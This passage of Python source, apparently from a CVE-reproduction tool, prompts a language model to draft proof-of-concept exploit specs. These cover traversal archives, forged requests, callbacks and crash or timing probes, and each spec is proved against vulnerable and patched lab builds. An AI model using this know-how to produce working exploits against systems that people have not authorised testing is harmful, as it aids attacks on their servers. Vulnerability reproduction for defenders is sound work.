    "assembled from what earlier steps bound, such as a header built from two of them. A "
    "step may use only a name an earlier step bound, or one of inputs. So discover covers "
    "two things. It enumerates what a target holds -- public projects, then "
    "the items in each -- so the spec names no object this lab happened to create. And it "
    "carries a value out of one response into a later request: a token, a nonce, a session "
    "or an OAuth state returned by a POST, extracted and then used by the probe. An effect "
    "that needs that handoff is expressible, and is not a reason to answer "
    "feasible=false.\n"
    "  setup: a short list of steps, at most ten, run against each build before the "
    "script and never shipped with it. An entry is a request, or {\"bind\": \"<name>\", "
    "\"query\": [<requests>], \"extract\": {<one of the four>}} to read a value out of a "
    "response and fill it into what follows, the probe included. That is how a secret the "
    "lab generates at boot is reached: a key printed at startup and served by the lab, an "
    "id handed back by a sign-up. A name bound this way must also be declared in inputs, "
    "because the script the operator receives asks them for their own value -- this only "
    "supplies the lab's, for the proof. Where the value is stable, lab_values_json is "
    "simpler; where it is fresh on every run, no fixed value can work and this is the only "
    "way. This is how the effect gets something to act on: "
    "the lab is empty, so where its validator seeded a document, an account, a file or a "
    "setting -- usually through a route the lab added for itself, which you can see in the "
    "validator source -- put those same calls here. They are HTTP whatever the probe "
    "speaks, they may fill in inputs, and they run on the vulnerable and the fixed build "
    "alike, so what they create cannot be what tells the two apart. Use setup for the "
    "precondition and the spec's own probe for the attack; a spec whose setup performs the "
    "attack proves nothing.\n"
    "  Whenever the spec declares inputs, put values that work against this lab in "
    "lab_values_json, a JSON object string mapping each input name to a value -- the "
    "account the lab seeds, the id of the object its validator uses, the credential its "
    "setup calls. They are used to prove the script here and are never shipped: the "
    "operator passes their own at run time. A value must be the kind of thing a real "
    "target also has, an id or a credential, never a route only the lab serves. Declaring "
    "an input and leaving its lab value out means the script cannot be proved at all.\n"
    "  A request may upload instead of carrying a body, which is how a crafted file or "
    "archive is sent: upload, a list of at most six parts. A form field is {\"name\": "
    "\"<field>\", \"value\": \"<text>\"}. A file part is {\"name\": \"<field>\", "
    "\"filename\": \"<name>\", \"content_type\": \"<type>\"} plus exactly one of: "
    "text, for a file whose content is text; base64, for bytes you already have; tar_gz "
    "or zip, each an object mapping a name inside the archive to its text, which the "
    "script builds at run time. An archive that escapes its extraction root, a bundle "
    "whose config the caller may not replace, a file whose name or type a filter should "
    "have refused -- all of those are expressible this way, and {{marker}} works inside a "
    "text, tar_gz or zip part because those are built per run. It cannot go in base64, "
    "which is sent as it is. A setup request may upload too, which is how a precondition "
    "that needs a file in place is met.\n"
    "  A spec may carry more than one check: checks, a non-empty list, each entry holding "
    "the strategy's own keys plus label, a short name that identifies it in the output. The "
    "keys of a single check may instead sit at the top level of the spec, which is the short "
    "form and what most answers want. Use several when the same weakness is reachable "
    "through more than one route -- work items and merge requests for one disclosure -- so a "
    "target that happens to hold nothing on one route still shows the other. Every check in "
    "one spec shares its strategy and its transport.\n"
    "  health_timeout, in seconds, is how long to wait for the service to answer before the "
    "script runs. Leave it out unless the project is slow to start, such as something that "
    "boots a JVM or runs migrations first.\n\n"
    "Read what_the_validator_observed before you choose an expectation. It holds what "
    "the lab's own run found on each build -- the status, where it was redirected, the "
    "fields it read back -- so the status your probe should expect is written down rather "
    "than guessed. A draft that guessed 302 for a forged request had it right, and the "
    "observation had said 302 against 403 all along.\n"
    "  It is there for that and only that: to make your expectation match what the "
    "service actually answers. Whether the effect occurred is not read off these bodies "
    "-- the_differential_is_already_measured above is the verdict, and these are the "
    "bodies it was reached from. A body is often a list or several objects, where the "
    "value the predicate matched sits in one of them and the others hold the control: "
    "read the predicate to see which, and never take the first element of a list as the "
    "result.\n"
    "Read validator_that_proved_it for what the lab had to do before it attacked. Where it "
    "calls a route to create a document, an account, a file or a setting first, those calls "
    "belong in setup, or the proof runs against an empty instance and your spec finds "
    "nothing on either build.\n\n"
    "Read what_the_lab_simulated before you answer. A harness that stands in for an "
    "application route is fine -- the weakness is still reached through it, and a real "
    "deployment has its own route of that shape. A harness that reports the effect is not: "
    "an endpoint the lab added so the validator could read internal state, or a page it "
    "renders to observe a browser, does not exist on a stock instance, so a spec aimed at "
    "it would pass against the lab and mean nothing against a real server. When the only "
    "evidence is of that kind, answer feasible=false and say so. Before you conclude that "
    "it is, read the paragraph on the channel below: nearly every adapter both reaches "
    "the code and reports the result, and a reported result does not by itself mean the "
    "effect is out of reach.\n"
    "  A project that ships no listener of its own -- a library, a parser, an "
    "instrumentation package, anything an application depends on -- is a different case, "
    "and used to be refused right here. It should not be. Nobody runs a library; they run "
    "an application that calls it, and that application serves a route of its own which "
    "reaches the vulnerable code. The lab's adapter stands in for exactly that route. So "
    "the one thing the spec cannot hardcode is the path, because the operator's "
    "application has its own: declare it as an input, name it something like target_path, "
    "write the probe as {\"method\": \"POST\", \"path\": \"{{target_path}}\"}, and put the "
    "lab's own adapter route in lab_values_json as that input's value so the script can be "
    "proved here. The operator passes --input target_path=/their/route at run time.\n"
    "    What makes this honest is that the payload is both the part that matters and the "
    "part the lab proved: the input that triggers the weakness is the same bytes wherever "
    "the library is called from. What a spec must not assume is a route only the lab "
    "serves, and declaring it as an input is how that assumption is removed. Say in "
    "observable_effect what the operator's route has to do to be in range -- that it "
    "passes a request body to the library's render, parse or decode entry point -- so a "
    "script pointed at a route that never reaches the library reports nothing, which is "
    "an honest answer rather than a false one.\n"
    "    The paragraph above settles the path. Settle the channel the same way, because "
    "the usual adapter does both jobs at once -- it reaches the vulnerable code and it "
    "also computes the value the validator read -- and that is where feasible=false keeps "
    "being answered wrongly. Separate the harness's diagnostic from the artifact the "
    "diagnostic was computed over. A field the adapter invented to summarise the result "
    "-- tail_nonzero, canary_deleted, a boolean the lab added so its validator had "
    "something to match -- is not on a stock instance and a spec must not aim at it. The "
    "artifact underneath it usually is: the decoded image, the cleaned or escaped text, "
    "the parsed document, the command output, the response the library's return value "
    "was rendered into. Ask what the operator's own route returns. If a route of theirs "
    "returns that artifact, the effect is in the artifact and not in the diagnostic: "
    "declare the route as an input exactly as above, aim the probe at the artifact, and "
    "say in observable_effect what the route must return to be in range. One shipped PoC "
    "is this shape end to end -- a library with no listener, the operator's target_path as "
    "its only input, and \"the operator's route must pass its JSON request body to "
    "quote() and run the result\" written into its own observable_effect.\n"
    "    Refuse on the channel when no route of any kind could carry the effect out of "
    "the process: state no response is a function of -- a property set on a built-in "
    "prototype that changes nothing an answer contains, a directory's mode bits, a "
    "counter only the harness reads. The test is not whether this lab's adapter reported "
    "it; the adapter always reports it. The test is whether a real application calling "
    "the same function could return anything that differs. When it could, the missing "
    "piece is a route the operator knows and the lab does not, and that is an input, not "
    "a refusal. Measured before this was written: of 115 labs that reproduced, 24 shipped "
    "a PoC, 12 were drafted and refused by the prover, and 79 were never drafted at all "
    "-- so a draft declining is by a wide margin the most expensive thing that happens "
    "here, and the channel is where it declined.\n"
    "    Where such a library's effect is a panic, the strategy is service_crash and the "
    "baseline is a route of the operator's application that answers normally. Where it is "
    "an algorithmic blowup, it is timing_differential. Between those two and the input "
    "above, a library CVE is expressible, and feasible=false is the wrong answer for it.\n"
    "  That list also decides which strategies can work here at all, so read it against "
    "the one you are about to choose. A lab that records outbound HTTP in process "
    "instead of sending it -- one disclosed exactly that, a 'global fetch in-process "
    "outbound recorder (no network)' -- can never make anything arrive at a listener, "
    "so oob_callback cannot be proved against it however real the request forgery is. A "
    "lab that simulated the browser renders nothing, so an effect only a page shows is "
    "out of reach there. Say that in the reason instead of proposing a strategy whose "
    "channel the lab replaced.\n\n"
    "What the lab had to seed is a different matter, and not a reason to answer "
    "feasible=false. A lab starts empty; an instance someone uses does not. So the lab "
    "created whatever the weakness acts on -- a project, a document and its id, an "
    "account, a file, an administrator's setting, a share -- and it usually created it "
    "through a route of its own, because that was the quickest way to get there. A real "
    "target already holds things of that kind, and a spec reaches them two ways. "
    "discover enumerates what this target has and binds it, which is exactly what it is "
    "for, so the spec names no object the lab happened to create. inputs asks the "
    "operator for what only they can know, a credential of their own included. Where the "
    "effect needs a setting applied first, the operator has their own instance and their "
    "own administrator: name that in observable_effect and let the script report nothing "
    "against a target that is not in that state, which is an honest answer rather than a "
    "false one. Answer feasible=false for state that cannot exist outside the lab, never "
    "for state the lab had to put there because it began with nothing.\n\n"
    "CVELab emits one script from your spec and runs it against the lab's builds. Where there "
    "are two it is kept only if it observes the effect on the vulnerable one and stays silent "
    "on the fixed one, so a spec that watches ordinary behaviour is discarded rather than "
    "shipped. Where the lab has no fixed build, which happens when the project publishes no "
    "resolvable patched revision, that check is unavailable and the strategy has to supply it: "
    "inband_differential, marker_roundtrip, oob_callback, service_crash and "
    "timing_differential each carry their own control and "
    "are allowed, while direct_observation is not, because its only check was the fixed build. "
    "A lab with no fixed build is not a reason to answer feasible=false."
)


def _port_hint(lab_dir: Path) -> int | None:
    """The port the service listens on, as the lab already states it.

    The first drafts were declined for want of this, and the lab had it all
    along: a healthcheck has to reach the application on its real port, and
    the Compose policy requires one. Read from the file rather than through
    `compose config`, so asking needs no container runtime.
    """
    for name, pattern in (
        ("docker-compose.yml", r"(?:127\.0\.0\.1|localhost|0\.0\.0\.0)[:/](\d{2,5})"),
        ("vulnerable/Dockerfile", r"(?mi)^\s*EXPOSE\s+(\d{2,5})"),
        # The validator reaches the service by name and port, so it states the
        # port whether or not anything else does: a lab with no healthcheck
        # and no EXPOSE left the draft to guess, and a spec with no port is
        # thrown away. Measured on an sftpgo lab whose only mention of 8080
        # was SERVICES = {'vulnerable': 'http://vulnerable:8080', ...}.
        ("validator/validator.py",
         r"(?mi)^\s*PORT\s*=\s*(\d{2,5})\s*$|"
         r"(?:vulnerable|patched|localhost|127\.0\.0\.1):(\d{2,5})"),
    ):
        path = lab_dir / name
        if not path.is_file():
            continue
        found = re.search(pattern, path.read_text(encoding="utf-8", errors="replace"))
        if found:
            for group in found.groups():
                if group and 1 <= int(group) <= 65535:
                    return int(group)
    return None


#: The validator's own attack is the best description of the effect there is:
#: it holds the exact requests that trigger it and how the response was
#: recognised, which is what a spec needs and what a prose contract leaves
#: out. Drafts were declining for want of a response shape to extract from.
_MAX_VALIDATOR_CHARS = 20_000


#: What the validator recorded, trimmed per build. Small on purpose: this is
#: the status, the location and the fields it read, not a page of HTML.
_MAX_OBSERVATION_CHARS = 1200


def _observation(lab_dir: Path) -> dict[str, Any]:
    """What the lab's validator actually saw on each build.

    The source says how it looked; this says what it found, and the two
    answer different questions. MobSF's draft had to guess the status its
    forged request would get and guessed 302 -- which was right, and which
    the validator had already written down as attack_status 302 against 403
    on the fixed build. Guessing was never necessary.
    """
    try:
        report = json.loads((lab_dir / "report.json").read_text(encoding="utf-8"))
    except (OSError, json.JSONDecodeError):
        return {}
    validation = report.get("validation")
    if not isinstance(validation, dict):
        return {}
    seen: dict[str, Any] = {}
    for build in ("vulnerable", "patched"):
        held = validation.get(build)
        if isinstance(held, dict):
            # Trimmed rather than summarised: a 403 page is 2 KB of styling
            # and the status beside it is the whole point.
            seen[build] = json.loads(
                json.dumps(held, ensure_ascii=True)[:_MAX_OBSERVATION_CHARS]
                .rsplit(",", 1)[0] + "}"
            ) if len(json.dumps(held)) > _MAX_OBSERVATION_CHARS else held
    return seen


#: One clause verdict per line, each cut at the limit autoflow's digest uses
#: for a validator result. Headroom rather than a real cut: across the ten
#: labs of the half-seen10-2026-11-07 panel the whole of effect_evidence ran
#: between 135 and 331 characters. Cut line-wise rather than by total length,
#: because each line is one clause's own verdict and half a line is worse
#: than one line fewer -- the last line is the differential's own verdict.
_MAX_EVIDENCE_LINES = 12
_MAX_EVIDENCE_LINE_CHARS = 600


def _measured_differential(lab_dir: Path) -> dict[str, Any]:
    """CVELab's verdict on the effect, handed over as a verdict.

    `_observation` above hands over what each build answered, which is what a
    spec needs in order to choose an expectation. It is not the question of
    whether the effect occurred: CVELab settled that against a declared
    predicate and wrote down the clause-by-clause result. This carries that
    result, so the draft is told the verdict instead of being left to
    re-derive it from raw bodies.

    Leaving it to re-derive was measured as a wrong answer, not merely a
    redundant one, and twice on one ten-lab panel -- both times the draft
    reported the opposite of what the record said, and refused on it.

    On a Pillow lab (panel half-seen10-2026-11-07) the vulnerable body is a
    451-character JSON array of six `runs` objects: the first holds
    `"tail_nonzero": false`, the five after it hold true, and the top-level
    `"tail_nonzero": true` sits beside them. The draft read the first element
    and refused, saying "the lab's own recorded observation found tail_nonzero
    false on both the vulnerable and the patched build, so nothing in the
    record shows the effect reliably".

    On a Mattermost lab in the same panel it swapped the two builds. The
    vulnerable observation holds `confirmed: true`, `blocked: false` and
    `"name":"..\\..\\cvelab-canary.txt"`; the patched one holds `confirmed:
    false`, `blocked: true` and the stripped `"name":"cvelab-canary.txt"`. The
    draft reported "the vulnerable build (v11.5.4) returning
    "name":"cvelab-canary.txt" with confirmed=false and blocked=true, the same
    basename the patched build returns" -- the patched build's line, read as
    the vulnerable one -- and refused because "the recorded run does not show
    the claimed effect there". It had already judged the shape expressible:
    "a field in an HTTP response, which a single instance can express as
    direct_observation with body_contains, so the shape is not the obstacle".
    That lab simulated nothing at all, so the record was the only obstacle.

    Both records said the opposite in three places at once:
    differential_confirmed true, a predicate naming exactly the string the
    vulnerable body carries, and evidence reading `vulnerable: ... passed=True`
    against `patched: ... passed=False`. Neither body was truncated and
    neither was lossy -- both sat well inside _MAX_OBSERVATION_CHARS, so
    trimming is not the fault and enlarging the observation would not help.

    What the draft actually had: the predicate reached it buried as one key of
    `confirmed_attack`, which is the plan's declaration of what would be
    measured and says nothing about whether it held; `differential_confirmed`
    reached it only as a line of Python inside `validator_that_proved_it`, a
    variable name in a source listing rather than a value; and
    `effect_evidence` did not reach it at all.

    `autoflow._validation_digest` carries these same three to the repair loop
    for exactly this reason, and the note it records is that a repair without
    them "could only guess". A draft was guessing in the same way, from the
    same report, one step further on.
    """
    try:
        report = json.loads((lab_dir / "report.json").read_text(encoding="utf-8"))
    except (OSError, json.JSONDecodeError):
        return {}
    if not isinstance(report, dict):
        return {}
    validation = report.get("validation")
    if not isinstance(validation, dict):
        validation = {}
    held = report.get("effect_evidence")
    evidence = [
        str(line)[:_MAX_EVIDENCE_LINE_CHARS]
        for line in (held[:_MAX_EVIDENCE_LINES] if isinstance(held, list) else [])
    ]
    return {
        # Read from validation, which is where the validator's own result
        # lands and what core's own differential_confirmed proof check reads.
        # The top-level copy is derived from this one.
        "differential_confirmed": validation.get("differential_confirmed"),
        # Why differential_confirmed is false has two entirely different
        # answers, and only this tells them apart. Where the project
        # publishes no resolvable patched revision there is no second build,
        # so false is the recorded shape of a VULNERABLE_ONLY lab rather than
        # a measurement that failed -- and the instructions have always said
        # that a lab with no fixed build is not a reason to answer
        # feasible=false. Handing over a bare false would have manufactured a
        # fresh wrong refusal in place of the one being fixed here: the same
        # ambiguity an empty simulated_components list already cost once.
        "a_fixed_build_was_tested": report.get("patched_tested") is True,
        # The predicate the effect was judged against, and the per-clause
        # result. The predicate is also inside confirmed_attack, and that is
        # deliberately not where it is read from: there it is the plan's
        # declaration of intent, here it is what the verdict was reached with.
        "effect_predicate": (report.get("proof_contract") or {}).get("effect_predicate"),
        "effect_evidence": evidence,
    }


def _validator_source(lab_dir: Path) -> str:
    path = lab_dir / "validator" / "validator.py"
    if not path.is_file():
        return ""
    return path.read_text(encoding="utf-8", errors="replace")[:_MAX_VALIDATOR_CHARS]


def draft_manual_poc_spec(
    cve: str,
    plan: dict[str, Any],
    *,
    api_key: str | None,
    model: str | None,
    provider: str | None,
    base_url: str | None,
    lab_dir: Path | None = None,
    complaint: str = "",
) -> dict[str, Any]:
    """Ask once whether the confirmed effect can be shown on one instance.

    Returns a dict with "spec" and "container_port" when the answer is usable,
    or "reason" when it is not. It never raises: the caller records whatever
    comes back and the lab stands either way.

    `complaint` is what a previous answer got wrong, which is put in front of
    the model with the request. It is set here for a spec whose shape this
    validator refused, and passed in by a caller whose spec was proved against
    the lab and did not hold up.

    A feasible=false answer is asked once more, with its own reason fed back
    through that same `complaint` channel. The mechanism was already here and
    simply never fired for this case: `_ask_for_spec` marked only a malformed
    spec for retry, so every decline was a single unretried sample. An archive
    audit put the cost at 8 to 12 labs of 48, and six labs had shipped on a
    human asking a refused run again by hand.

    The second ask is bounded at one and does not touch the shape-retry
    budget. It is not a lowering of the bar: whatever the second answer
    offers is still emitted as a script and proved against both builds, and
    of the 11 labs that were drafted and refused by that proof, 9 ran on both
    builds and the script fired on neither -- not one false positive has ever
    had to be rejected there, so asking again protects nothing less.
    """
    answer = _draft_until_the_shape_fits(
        cve, plan, complaint, api_key=api_key, model=model,
        provider=provider, base_url=base_url, lab_dir=lab_dir,
    )
    if "spec" in answer or "declined" in answer or not answer.pop("reconsider", False):
        return answer
    refused = str(answer.get("reason") or "")
    progress.step(f"the draft declined, asking once more: {refused[:120]}")
    second = _draft_until_the_shape_fits(
        cve, plan, _reconsider_complaint(refused), api_key=api_key, model=model,
        provider=provider, base_url=base_url, lab_dir=lab_dir,
    )
    # Dropped rather than honoured: this is the one extra ask, so a second
    # decline is the answer. Without this the two declines would ask forever.
    second.pop("reconsider", None)
    if "spec" in second:
        return second
    # The second ask produced no verdict of its own -- the provider declined
    # it, or the call failed -- and the first ask did. Keep the first, because
    # a model that answered feasible=false and said why is the more
    # informative record and the truer one: reporting the lab as
    # provider-declined would overwrite a real answer with the absence of
    # one, and "no manual PoC" is only actionable if it says why. This is the
    # one way asking twice could have made a record worse than asking once.
    if "declined" in second or str(second.get("reason", "")).startswith(
        "the spec call failed"
    ):
        kept = dict(answer)
        kept["reconsidered"] = (
            "asked again after this answer; the second ask returned no verdict "
            f"({second.get('reason')})"
        )
        return kept
    return second


def _draft_until_the_shape_fits(
    cve: str,
    plan: dict[str, Any],
    complaint: str,
    *,
    api_key: str | None,
    model: str | None,
    provider: str | None,
    base_url: str | None,
    lab_dir: Path | None,
) -> dict[str, Any]:
    """One ask, repeated while the answer does not fit the schema.

    Split out from `draft_manual_poc_spec` so that the extra ask after a
    feasible=false has its own budget: a decline must not be able to spend
    the shape retries, and a malformed spec must not be able to spend the
    reconsideration.
    """
    attempts = _draft_retries() + 1
    for _attempt in range(attempts):
        answer = _ask_for_spec(
            cve, plan, complaint, api_key=api_key, model=model,
            provider=provider, base_url=base_url, lab_dir=lab_dir,
        )
        if "spec" in answer or "declined" in answer or not answer.get("retry"):
            answer.pop("retry", None)
            return answer
        # The shape was wrong, which is not the provider declining anything:
        # it is this validator telling the model its answer did not fit, so
        # saying what was wrong and asking once more is ordinary iteration.
        complaint = str(answer["reason"])
        if _attempt + 1 < attempts:
            progress.step(f"the drafted spec did not fit, asking again: {complaint[:120]}")
    answer.pop("retry", None)
    return answer


def _reconsider_complaint(refused: str) -> str:
    """What goes in front of the one extra ask after a feasible=false.

    It feeds the decline back rather than rewording the request, which is the
    same thing `complaint` already does for a spec whose shape was refused.
    Nothing here says the decline was wrong: of 48 declines in the archive
    audit, 24 were correct and have to stay correct, so this names the
    recoverable shapes and says plainly that answering feasible=false again is
    a real answer. What it does not do is leave the first sample unexamined,
    which is what every decline used to be.
    """
    return (
        "You already answered feasible=false for this same finding, saying:\n"
        f"{refused.strip()[:1500]}\n\n"
        "Reconsider once and answer again. Most declines on record turned out to name "
        "one of four things that have answers above, so check your reason against them "
        "before giving it a second time.\n"
        "  The project ships no listener of its own. That is the condition for declaring "
        "the route as an input -- {{target_path}}, with the lab's adapter route as its lab "
        "value -- and not a reason to decline.\n"
        "  The only thing that reported the effect was the lab's own adapter. Separate its "
        "diagnostic from the artifact underneath: if a route of the operator's returns that "
        "artifact -- the decoded bytes, the cleaned text, the parsed document, the command "
        "output -- aim at the artifact and declare the route.\n"
        "  The effect needs something to act on that this lab had to create. discover "
        "enumerates what a real target already holds, inputs asks the operator for what "
        "only they know, and setup supplies the lab's own for the proof.\n"
        "  The effect comes back in no answer at all. oob_callback, service_crash and "
        "timing_differential each carry their own control for exactly that.\n"
        "If your reason is none of those and the effect genuinely cannot be observed "
        "against one live instance -- it needs two clients driven at once, or state no "
        "response is a function of, or a second host you control -- answer feasible=false "
        "again and say so. That is a correct answer and it will be recorded as one. Do not "
        "offer a spec you do not believe separates the two builds: it is emitted as a "
        "script, run against both, and discarded unless it shows the effect on the "
        "vulnerable build and stays silent on the fixed one."
    )


def _draft_retries() -> int:
    """How often a spec that did not fit is asked for again (CVELAB_SPEC_RETRIES)."""
    raw = os.getenv("CVELAB_SPEC_RETRIES", "").strip()
    try:
        value = int(raw) if raw else 1
    except ValueError:
        return 1
    return max(0, min(value, 3))


def _ask_for_spec(
    cve: str,
    plan: dict[str, Any],
    complaint: str,
    *,
    api_key: str | None,
    model: str | None,
    provider: str | None,
    base_url: str | None,
    lab_dir: Path | None,
) -> dict[str, Any]:
    try:
        answered = structured_response(
            api_key=api_key,
            model=model,
            provider=provider,
            base_url=base_url,
            instructions=_DRAFT_INSTRUCTIONS,
            input_text=json.dumps({
                "cve": cve,
                "cwe": plan.get("cwe"),
                "repository": plan.get("repository"),
                "revisions": plan.get("revisions"),
                "confirmed_attack": plan.get("exploit_contract") or {},
                # CVELab's verdict, named rather than left to be inferred,
                # and placed here on purpose: ahead of the validator source,
                # which is up to _MAX_VALIDATOR_CHARS of the 40 KB this input
                # gets, so the verdict cannot be what _MAX_DRAFT_INPUT cuts.
                # The digest this mirrors records the same placement reason
                # from the other side -- "the report is the last key and the
                # first thing the prompt's limit cuts".
                "the_differential_is_already_measured": (
                    _measured_differential(lab_dir) if lab_dir else {}
                ),
                "container_port": _port_hint(lab_dir) if lab_dir else None,
                "validator_that_proved_it": _validator_source(lab_dir) if lab_dir else "",
                "what_the_validator_observed": _observation(lab_dir) if lab_dir else {},
                # What the lab says it stood in for. Measured: four of five
                # labs that reproduced but shipped nothing had proved their
                # CVE through an endpoint the product does not serve, and this
                # is where the lab admits that.
                "what_the_lab_simulated": (plan.get("fidelity") or {}).get(
                    "simulated_components"
                ) or [],
                # Without this an empty simulated list is ambiguous: it can
                # mean nothing was simulated, which is the best case, or that
                # the lab said nothing. One draft read the empty list as "the
                # simulation record is empty" and refused partly on that.
                "the_product_itself_was_started": bool(
                    (plan.get("fidelity") or {}).get("vendor_product_started")
                ),
                **({"your_previous_answer_was_rejected": complaint} if complaint else {}),
            }, indent=2, ensure_ascii=True)[:_MAX_DRAFT_INPUT],
            schema=MANUAL_POC_DRAFT_SCHEMA,
            schema_name="cvelab_manual_poc_spec",
            max_output_tokens=8000,
        )
    except ProviderDeclined as declined:
        # Not retried and not reworded: the provider answered, and the same
        # request asked again gets the same answer.
        return {
            "reason": "the provider declined to draft a spec",
            "declined": {"provider": declined.provider, "model": declined.model},
        }
    except Exception as error:  # noqa: BLE001 - the lab is already finished
        return {"reason": f"the spec call failed: {type(error).__name__}: {error}"[:400]}

    if not answered.get("feasible"):
        return {
            "reason": str(answered.get("reason") or "").strip()
            or "the model judged the effect not observable on one instance",
            # Asked once more with this reason fed back, and only once. Not
            # because a decline is wrong by default -- half of them are right
            # and have to stay right -- but because it was a single unretried
            # sample of a sampled answer. One lab asked nine times produced
            # six scripts and three declines, every decline explaining at
            # length that a library with no listener cannot be shown on one
            # instance, while six scripts for that same library already
            # existed on identical input. One sample was never the measure.
            #
            # Distinct from "retry" above, which means the answer did not fit
            # the schema and is bounded by CVELAB_SPEC_RETRIES. This means the
            # answer fit and said no. The two budgets are kept apart so a
            # decline cannot spend the shape retries or the other way round.
            "reconsider": True,
        }
    offered = answered.get("spec_json")
    if not isinstance(offered, str) or not offered.strip():
        return {"reason": "the answer said feasible but carried no spec", "retry": True}
    try:
        spec = validate_spec(json.loads(offered))
    except json.JSONDecodeError as error:
        return {"reason": f"spec_json was not valid JSON: {error}", "retry": True}
    except (ValueError, TypeError) as error:
        # Named precisely: two of two DeepSeek drafts were rejected for shape,
        # once for a strategy it invented and once for an empty probe, and a
        # bare "not usable" left nothing to correct.
        return {"reason": f"the drafted spec is not usable: {error}", "retry": True}
    port = answered.get("container_port")
    if not isinstance(port, int) or not 1 <= port <= 65535:
        # The lab states it in its healthcheck, so an answer that leaves it
        # out is not a reason to throw an otherwise usable spec away.
        port = _port_hint(lab_dir) if lab_dir else None
    if not isinstance(port, int) or not 1 <= port <= 65535:
        return {"reason": "the answer gave no port the service listens on", "retry": True}
    return {"spec": spec, "container_port": port,
            "lab_values": _lab_values(answered.get("lab_values_json"), spec["inputs"])}


def _lab_values(offered: Any, declared: tuple[str, ...] | list[str]) -> dict[str, str]:
    """The values that let a spec declaring inputs be proved against the lab.

    Only the names the spec actually declares are kept, and only as text. A
    name nothing declares would reach no request anyway, and anything else in
    there is not an input value.
    """
    if not isinstance(offered, str) or not offered.strip():
        return {}
    try:
        held = json.loads(offered)
    except json.JSONDecodeError:
        return {}
    if not isinstance(held, dict):
        return {}
    return {
        name: str(held[name]) for name in declared
        if isinstance(held.get(name), (str, int, float)) and str(held[name])
    }


def manual_poc_step(
    *,
    api_key: str | None,
    model: str | None,
    provider: str | None,
    base_url: str | None,
    assume_yes: bool = False,
    inputs: dict[str, str] | None = None,
) -> Callable[..., dict[str, Any]]:
    """The hook `run_lab` calls once a lab has reproduced, services still up.

    It is injected rather than imported so that core keeps knowing nothing
    about providers: a lab is built and validated with no model configured at
    all, and that has to stay true.
    """
    def step(
        cve: str,
        lab_dir: Path,
        plan: dict[str, Any],
        compose: list[str],
        environment: dict[str, str],
        reproduced: bool,
    ) -> dict[str, Any]:
        if not reproduced:
            return {
                "shipped": False,
                "reason": "the lab did not reproduce, so there was nothing to hand over",
            }
        if not ai_is_configured(api_key, model, provider):
            return {"shipped": False, "reason": "no model configured for the spec call"}
        progress.step("asking whether the effect can be shown on one instance")
        drafted = draft_manual_poc_spec(
            cve, plan, api_key=api_key, model=model, provider=provider,
            base_url=base_url, lab_dir=lab_dir,
        )
        if "spec" not in drafted:
            progress.step(f"no manual PoC: {drafted['reason']}")
            return {"shipped": False, **drafted}
        spec, port, outcome = _prove_drafted_spec(
            cve, plan, drafted, lab_dir, compose, environment, assume_yes,
            inputs, api_key=api_key, model=model, provider=provider,
            base_url=base_url,
        )
        write_manual_poc(cve, lab_dir, plan, spec, port, outcome)
        if not outcome["shipped"]:
            progress.step(f"no manual PoC: {outcome.get('reason')}")
        return outcome

    return step


def write_manual_poc(
    cve: str,
    lab_dir: Path,
    plan: dict[str, Any],
    spec: dict[str, Any],
    port: int,
    outcome: dict[str, Any],
) -> dict[str, Any]:
    """Write the artifact, with whichever remote mode this run earned.

    The script text is taken out of the outcome and the rest of it is the
    record: the caller returns it and `run_lab` writes it to report.json as
    `manual_poc_field`, which is where the proved spec now lives. The spec
    goes down either way, under a key that says whether it earned the
    handover. A proven one is read back, so asking again for the same lab
    reuses the answer instead of sampling a new one -- a drafted spec varies
    between calls, so without that a lab that produced a script one day could
    refuse the next with nothing having changed. A refused one is kept
    because "the script did not tell the two builds apart" says nothing about
    which check was wrong, and the attempt is the only place that holds the
    answer.

    `PoC.py` is written here and again by the deliverables pass, from the
    same record and the same validator, so the two agree byte for byte; this
    one is what the proof ran, and it is on disk before anything reads it.
    `lab_values` stay in the record because an input spec cannot be re-proved
    without them, and they are the lab's own -- the route its adapter serves,
    the account its setup created. plan.json carries the same contract and is
    already shared.
    """
    artifacts = lab_dir / "artifacts"
    artifacts.mkdir(parents=True, exist_ok=True)
    script = str(outcome.pop("script", ""))
    outcome["cve"] = cve
    outcome["container_port"] = port
    outcome["spec" if script else "attempted_spec"] = spec
    target = artifacts / POC_NAME
    write_text(target, emit_poc(cve, plan, _lab_validator(lab_dir), outcome))
    target.chmod(0o755)
    # The three the merged artifact absorbed, removed where an older CVELab
    # left them: a stale script claiming to be the handover, beside one that
    # now is, is the pair of files this merge replaced.
    for name in LEGACY_MANUAL_POC_NAMES:
        (artifacts / name).unlink(missing_ok=True)
    report_path = lab_dir / "report.json"
    outcome["deliverables"] = {"poc": str(target), "record": str(report_path)}
    # Written here as well as by `run_lab`, because `cvelab manual` runs
    # on a lab that has already validated and writes no report of its own: a
    # spec proved by that command used to survive in Manual-PoC.json, and
    # would otherwise be redrafted on the next ask. Set after `deliverables`,
    # so the two copies of the record do not differ by a key.
    held = _read_json(report_path)
    if held and held.get("manual_poc_field") != outcome:
        held["manual_poc_field"] = outcome
        write_text(
            report_path, json.dumps(held, indent=2, ensure_ascii=True) + "\n"
        )
    return outcome
